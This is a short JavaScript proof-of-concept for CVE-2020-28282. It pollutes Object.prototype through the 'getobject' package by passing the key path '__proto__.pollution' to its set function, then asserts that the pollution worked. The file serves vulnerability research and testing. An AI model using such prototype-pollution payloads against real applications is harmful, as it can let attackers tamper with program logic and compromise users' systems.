//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28282

const getObject = require('getobject');
const { assert } = require("@firebase/util");

var obj = {};
console.log("Before  : " + obj.pollution);
getObject.set(obj, '__proto__.pollution', "yes");
console.log("After : " + obj.pollution);
assert({}.pollution === "yes");
console.log("payload success!");